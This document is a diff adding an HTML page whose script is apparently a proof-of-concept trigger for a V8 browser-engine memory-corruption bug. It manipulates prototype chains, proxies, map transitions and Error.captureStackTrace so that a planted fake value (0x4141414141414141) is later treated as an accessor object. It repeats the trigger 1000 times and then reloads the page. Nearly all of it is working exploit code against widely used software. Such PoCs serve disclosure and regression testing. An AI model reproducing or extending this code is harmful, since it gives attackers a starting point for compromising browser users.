@@ -1,0 +1,80 @@
+<body>
+<script>
+class Utils {
+  static bigIntAsDouble(big_int) {
+    Utils.#big_int_array[0] = big_int;
+    return Utils.#double_array[0];
+  }
+
+  static transitionToSlow(object) {
+    try {
+      // `SetOrCopyDataProperties` will make `object` transition to slow properties
+      // then throw while trying to access the first property of `source.`
+      Object.assign(object, Utils.#slow_source);
+    } catch { }
+  }
+
+  static transitionToFastPrototype(object) {
+    // Assigning `__proto__` will make `object` transition to a prototype map.
+    // `Enumerate` will call `MakePrototypesFast`.
+    for (let x in { __proto__ : object }) {}
+  }
+
+  // Some interceptors call `GetRealNamedPropertyAttributesInPrototypeChain`. If there is a JSProxy
+  // in the prototype chain, the function will attempt to invoke the `getOwnPropertyDescriptor` handler.
+  static setInterceptorOnceCallback(object, callback) {
+    let prototype = Object.getPrototypeOf(object);
+    let grand_prototype = Object.getPrototypeOf(prototype);
+
+    Object.setPrototypeOf(prototype, new Proxy({}, {get getOwnPropertyDescriptor() {
+      Object.setPrototypeOf(prototype, grand_prototype);
+
+      callback();
+    }}));
+  }
+
+  static #big_int_array = new BigUint64Array(1);
+  static #double_array = new Float64Array(Utils.#big_int_array.buffer);
+  static #slow_source = {};
+  static {
+    for (let i = 0; i < 2048; ++i) {
+      Object.defineProperty(Utils.#slow_source, `p${i}`, {enumerable: true, get() { throw 1 }});
+    }
+  }
+};
+
+// Used by `Error.captureStackTrace`.
+const PROPERTY_NAME = "stack";
+
+function trigger(index) {
+  // The collections are cached; pass an index to get a new one each time.
+  let object = document.getElementsByTagName(index);
+
+  Utils.setInterceptorOnceCallback(object, _ => {
+    // Needed to force `ReoptimizeIfPrototype` inside `TransitionToAccessorPair`.
+    Utils.transitionToFastPrototype(object);
+
+    Error.captureStackTrace(object);
+    // Trigger `TransitionToAccessorPair` -- makes `object` fast.
+    Object.defineProperty(object, "stack", {enumerable: false});
+    Utils.transitionToSlow(object);
+
+    // Add more properties to rehash the dictionary.
+    for (let i = 0; i < index; ++i) {
+      object[`p${i}`] = 1;
+    }
+  });
+  // Pass a holder that doesn't contain the property to trigger a second lookup.
+  // The stored value will be interpreted as an accessor object later.
+  Reflect.set({}, PROPERTY_NAME, Utils.bigIntAsDouble(0x4141414141414141n), object);
+
+  // Trigger `TransitionToAccessorPair` again.
+  Object.defineProperty(object, PROPERTY_NAME, {enumerable: true, value: 1});
+}
+
+for (let index = 0; index < 1000; ++index)
+  trigger(index);
+
+location.reload();
+</script>
+</body>
